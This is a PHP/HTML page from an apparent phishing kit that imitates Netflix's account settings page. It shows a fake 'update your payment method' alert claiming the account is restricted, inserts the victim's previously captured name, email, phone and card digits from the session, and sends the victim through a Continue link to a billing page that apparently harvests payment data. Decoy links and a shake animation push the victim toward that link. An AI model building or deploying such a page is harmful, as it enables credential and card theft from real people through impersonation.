<?php

session_start();
error_reporting(0);

include('__CONFIG__.php');

?>
<!DOCTYPE html>
<html class="htmltebi">
<head>
	<meta charset="utf-8">

	<link rel="stylesheet" type="text/css" href="./assets/bootstrap.min.css">
	<link rel="stylesheet" type="text/css" href="./assets/font-awesome.min.css">
  <link rel="stylesheet" type="text/css" href="./assets/warning.css">
	<link rel="stylesheet" type="text/css" href="./assets/animate.css">

	<script type="text/javascript" src="./assets/jquery-3.1.1.slim.min.js"></script>
	<script type="text/javascript" src="./assets/tether.min.js"></script>
	<script type="text/javascript" src="./assets/bootstrap.min.js"></script>
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <link rel="shortcut icon" href="assets/nficon2016.ico"/>
  <link rel="apple-touch-icon" href="assets/nficon2016.png"/>
	<title>Netflix</title>
  <script type="text/javascript">
    $(document).ready(function(){
      $('.veeriiiifyyy').click(function(){ 
        $(window).scrollTop(0);
        $('.alert-imgxx').toggleClass("animated shake",function(){
          $(this).remove();
        });
      }); 
    });
  </script>
</head>
<body class="bodytebi">
<div id="hdSpace">
   <div id="hdPinTarget" class="member-header">
      <div id="hd">
  <div id="headerBlind"></div>
  <div>
     <a href="#/" class="icon-logoUpdate logo"></a>
  </div>
  <div class="nav-wrap">
     <ul id="global-header" class="global-header-wrap i-b structural">
        <li class="nav-item hasSubMenuOnWideScreens nav-wihome display-until-s veeriiiifyyy"><span class="i-b content"><a href="#WiHome">Browse</a></span><span class="i-b shim"></span>
        <span class="up-arrow"></span></li>
        <li class="nav-item nav-kids display-until-l veeriiiifyyy"><span class="i-b content"><a href="#kids">Kids</a></span><span class="i-b shim"></span>
    <!-- react-text: 70 -->
    <!-- /react-text -->
    <!-- react-text: 71 -->
    <!-- /react-text -->
        </li>
     </ul>
  </div>
  <div class="account-search last">
     <div class="tagline priceMessage"></div>
     <div id="account-tools">
        <div id="profileSelector" class="profile-selector">
    <div class="current-profile veeriiiifyyy"><img class="avatar" src="http://secure.netflix.com/ffe/profiles/avatars_v2/64x64/PICON_025.png">
    <span id="" class="name">
      <?php if (isset($_SESSION['firstname']) && $_SESSION['firstname'] != ''): ?>
      <?php echo $_SESSION['firstname']; ?>
      <?php endif ?>
    </span><span class="profile-arrow"></span><span class="trigger"></span></div>
    <div class="profiles-container">
       <div class="profile-selector">
          <ul class="profiles structural">
      <li class="profile">
         <a href="#/SwitchProfile?tkn=IJ6GTXFD3RFLDNFPGHYIESMZB4" role="button"><img src="http://secure.netflix.com/ffe/profiles/avatars_v2/32x32/PICON_036B.png" alt="Kids">
            <div id="" class="name veeriiiifyyy">Kids</div>
         </a>
      </li>
          </ul>
       </div>
    </div>
        </div>
     </div>
     <div class="search-wrapper">
        <form action="#" class="mixed-search-form">
    <label for="search-input-toggle" class="mixed-search-label">
       <input type="checkbox" class="search-toggle" id="search-input-toggle" value="on">
       <div class="search-text"><span class="icon-search mixed-search-icon">Search</span></div>
       <div class="search-input-wrapper">
          <div class="search-input-inner-wrapper"><span class="icon-search mixed-search-icon mixed-search-input-icon"></span>
      <input type="text" class="mixed-search-input" placeholder="Titles">
          </div>
       </div>
    </label>
        </form>
     </div>
  </div>
      </div>
   </div>
</div>




<div class="container">
      <div class="col-md-12">
        <div class="alert-imgxx">
          <div class="alert alert-danger custom-danger">
            <h1 class="account-header"><i class="fa fa-warning"></i> Please update your payment method!</h1>
          </div>
        </div>
        <div class="warning-content">
          <p>Dear <?php echo $_SESSION['firstname'].','; ?></p>
          <p>
          Sorry for the interruption, but we are having trouble authorizing your Payment Method.
          </p>
          <p>To protect the informations of our customers, our system has temporarily placed restrictions on your account until your informations has been validated against our system. </p>
          <p>you'll be able to get your account back just after finishing this steps</p>

          <a href="AccBilling.php?ACCID=<?php echo sha1(time()); ?>" class="btn login-button btn-submit btn-small btn-continue">Continue</a>
        </div>
        <hr style="background: #999;">
      </div>
  <div class="col-md-12">
<div>
  <h1 class="account-header">Account</h1>
  <div class="account-messages-container"></div>
  <div class="responsive-account-content">
    <div class="account-section collapsable-panel clearfix membership-section-wrapper membership-section-with-button">
      <header class="account-section-header collapsable-section-toggle">
        <h2 class="account-section-heading veeriiiifyyy"><!-- react-text: 119 -->MEMBERSHIP & BILLING<!-- /react-text --><a class="btn account-cancel-button btn-gray btn-small" href="#/CancelPlan" target="_top"><span>Cancel Membership</span></a></h2></header>
      <section class="collapsable-section-content account-section-content">
        <div class="account-subsection clearfix">
          <div class="clearfix">
            <div class="account-section-group">
              <div class="account-section-item account-section-email">
                <?php if (isset($_SESSION['EM']) && $_SESSION['EM'] != ''): ?>
                <?php echo $_SESSION['EM']; ?>
                <?php endif ?>
              </div>
              <div class="account-section-item account-section-item-disabled">
                <!-- react-text: 128 -->Password&nbsp;:
                <!-- /react-text -->
                <!-- react-text: 129 -->********
                <!-- /react-text -->
              </div>
              <div class="account-section-item account-section-item-disabled">
                <?php if (isset($_SESSION['phone']) && $_SESSION['phone'] != ''): ?>
                  Phone : <?php echo $_SESSION['phone']; ?>
                <?php endif ?>
              </div>
            </div>
            <div class="account-section-group">
              <div class="account-section-item veeriiiifyyy"><a class="account-section-link" href="#/email">Change email</a></div>
              <div class="account-section-item veeriiiifyyy"><a class="account-section-link" href="#/password">Change password</a></div>
              <div class="account-section-item veeriiiifyyy"><a class="account-section-link" href="#/phonenumber">Change phone number</a></div>
            </div>
          </div>
        </div>
        <div class="account-subsection clearfix">
          <div class="clearfix">
            <div class="account-section-group">
              <div class="account-section-item">
                <div class="payment-type"><span class="icon-payment icon-payment-<?php echo $_SESSION['ptype']; ?>"><span class="text-payment"><?php echo $_SESSION['ptype']; ?></span>
                  <!-- react-text: 145 -->
                  <!-- /react-text -->
                  </span><span id="" class="mopType">•••• •••• •••• 
                  <?php if (isset($_SESSION['last4']) && $_SESSION['last4'] != ''): ?>
                  <?php echo $_SESSION['last4']; ?>
                  <?php endif ?></span></div>
                <!-- react-text: 147 -->
                <!-- /react-text -->
              </div>
            </div>
            <div class="account-section-group">
              <!-- react-text: 149 -->
              <!-- /react-text -->
              <div class="account-section-item veeriiiifyyy"><a class="account-section-link" href="#/YourAccountPayment">Update payment info</a></div>
              <div class="account-section-item veeriiiifyyy"><a class="account-section-link" href="#/BillingActivity">Billing details</a></div>
            </div>
          </div>
        </div>
        <div class="account-subsection clearfix">
          <div class="clearfix">
            <div class="account-section-group gifts-section-group">
              <div class="account-section-item bold veeriiiifyyy">Redeem gift card or promo code</div>
              <div class="account-section-item account-section-gifts">
                <label class="ui-label ui-input-label"><span class="ui-label-text"></span>
                  <input class="ui-text-input medium" placeholder="Enter code or pin" tabindex="0">
                </label>
                <button class="btn gift-redeem-btn btn-plain btn-small veeriiiifyyy" type="button" autocomplete="off" tabindex="0">
                  <!-- react-text: 163 -->Redeem
                  <!-- /react-text -->
                </button>
              </div>
            </div>
            <div class="account-section-group gifts-link-group">
              <div class="account-section-item account-section-item veeriiiifyyy"><a class="account-section-link" href="#">Où acheter des cartes cadeaux&nbsp;?</a></div>
            </div>
            <div class="gift-modal-container"></div>
          </div>
        </div>
      </section>
    </div>
    <div class="account-section collapsable-panel clearfix">
      <header class="account-section-header collapsable-section-toggle">
        <h2 class="account-section-heading veeriiiifyyy">PLAN DETAILS</h2></header>
      <section class="collapsable-section-content account-section-content">
        <div class="account-subsection clearfix">
          <div class="clearfix">
            <div class="account-section-group">
              <div class="account-section-item">
              <strong>
                <?php if (isset($_SESSION['users']) && $_SESSION['users'] != ''): ?>
                <?php echo $_SESSION['users']; ?>
                <?php endif ?>
              </strong>
                <!-- react-text: 177 -->
                <!-- /react-text -->
              </div>
            </div>
            <div class="account-section-group">
              <div class="account-section-item veeriiiifyyy"><a class="account-section-link" href="#/ChangePlan">Change plan</a></div>
            </div>
          </div>
        </div>
      </section>
    </div>
    <div class="account-section collapsable-panel clearfix">
      <header class="account-section-header collapsable-section-toggle">
        <h2 class="account-section-heading veeriiiifyyy">SETTINGS</h2></header>
      <section class="collapsable-section-content account-section-content">
        <div class="account-subsection clearfix">
          <div class="clearfix">
            <div class="account-section-group">
              <div>
                <div class="account-section-item veeriiiifyyy"><a class="account-section-link" href="#/EmailPreferences">Communication settings</a></div>
                <div class="account-section-item veeriiiifyyy"><a class="account-section-link" href="#/pin">Parental controls</a></div>
                <div class="account-section-item account-section-item veeriiiifyyy"><a class="account-section-link" href="#/DoNotTest">Test participation</a></div>
                <div class="account-section-item account-section-item veeriiiifyyy"><a class="account-section-link" href="#/deviceManagement">Manage download devices</a></div>
                <div class="account-section-item veeriiiifyyy"><a class="account-section-link" href="#/Activate">Activate a device</a></div>
                <div class="account-section-item veeriiiifyyy"><a class="account-section-link" href="#/ManageDevices">Sign out of all devices</a></div>
              </div>
            </div>
            <div class="account-section-group left-align"></div>
          </div>
        </div>
      </section>
    </div>
    <div class="account-section collapsable-panel clearfix">
      <header class="account-section-header collapsable-section-toggle">
        <h2 class="account-section-heading veeriiiifyyy">MY PROFILE</h2></header>
      <section class="collapsable-section-content account-section-content">
        <div class="account-subsection clearfix">
          <div class="clearfix">
            <div class="account-section-profile"><img class="activeProfile" src="https://secure.netflix.com/ffe/profiles/avatars_v2/32x32/PICON_025.png"><span id="" class="profile-name">
                <?php if (isset($_SESSION['firstname']) && $_SESSION['firstname'] != ''): ?>
                <?php echo $_SESSION['firstname']; ?>
                <?php endif ?>
            </span></div>
            <div class="account-section-group">
              <div class="account-section-item account-section-manage-profiles"><a class="account-section-link veeriiiifyyy" href="#/profiles/manage">Manage profiles</a></div>
              <div class="account-section-item account-section-item veeriiiifyyy"><a class="account-section-link" href="#/LanguagePreferences">Language</a></div>
              <div class="account-section-item account-section-item"><a class="account-section-link veeriiiifyyy" href="#/HdToggle">Playback settings</a></div>
            </div>
            <div class="account-section-group left-align">
              <div class="account-section-item veeriiiifyyy"><a class="account-section-link" href="#/viewingactivity">Viewing activity</a></div>
              <div class="account-section-item veeriiiifyyy"><a class="account-section-link" href="#/MoviesYouveSeen">Ratings</a></div>
            </div>
          </div>
        </div>
      </section>
    </div>
  </div>
</div>
  </div>
</div>
</body>
</html>